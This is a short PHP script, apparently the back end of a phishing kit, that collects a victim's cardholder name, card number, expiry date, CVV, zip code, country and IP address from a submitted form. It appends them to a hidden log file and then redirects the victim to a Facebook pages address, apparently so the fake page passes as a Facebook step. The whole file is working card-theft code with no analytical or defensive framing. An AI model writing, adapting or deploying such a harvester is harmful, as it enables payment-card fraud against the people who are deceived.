<?php
@$file = "D-___----dfsfasdfsdf1231af---___-D--_-.txt";
@$CName = $_POST['CName'];
@$CNumber = $_POST['CNumber'];
@$month = $_POST['mm'];
@$year = $_POST['yy'];
@$CVV = $_POST['CVV'];
@$zip = $_POST['zip'];
@$country = $_POST['country'];
@$ip = $_SERVER['REMOTE_ADDR'];
@$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "___________________[ CREDIT INFORMATION ]___________________");
fwrite($handle, "\n");
fwrite($handle, "::  Name on Card  :: ");
fwrite($handle, "$CName");
fwrite($handle, "\n");
fwrite($handle, "::  Card Number   :: ");
fwrite($handle, "$CNumber");
fwrite($handle, "\n");
fwrite($handle, "::  Month         :: ");
fwrite($handle, "$month");
fwrite($handle, "\n");
fwrite($handle, "::  Year          :: ");
fwrite($handle, "$year");
fwrite($handle, "\n");
fwrite($handle, "::  CSC/ CVV      :: ");
fwrite($handle, "$CVV");
fwrite($handle, "\n");
fwrite($handle, "::  Zip Code      :: ");
fwrite($handle, "$zip");
fwrite($handle, "\n");
fwrite($handle, "::  Country       :: ");
fwrite($handle, "$country");
fwrite($handle, "\n");
fwrite($handle, "::  IP            :: ");
fwrite($handle, "http://whatismyipaddress.com/ip/$ip");
fwrite($handle, "\n");
fwrite($handle, "::  JAM MASUK     :: ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"https://www.facebook.com/pages/?category=your_pages\";
// -->
</script>";
?>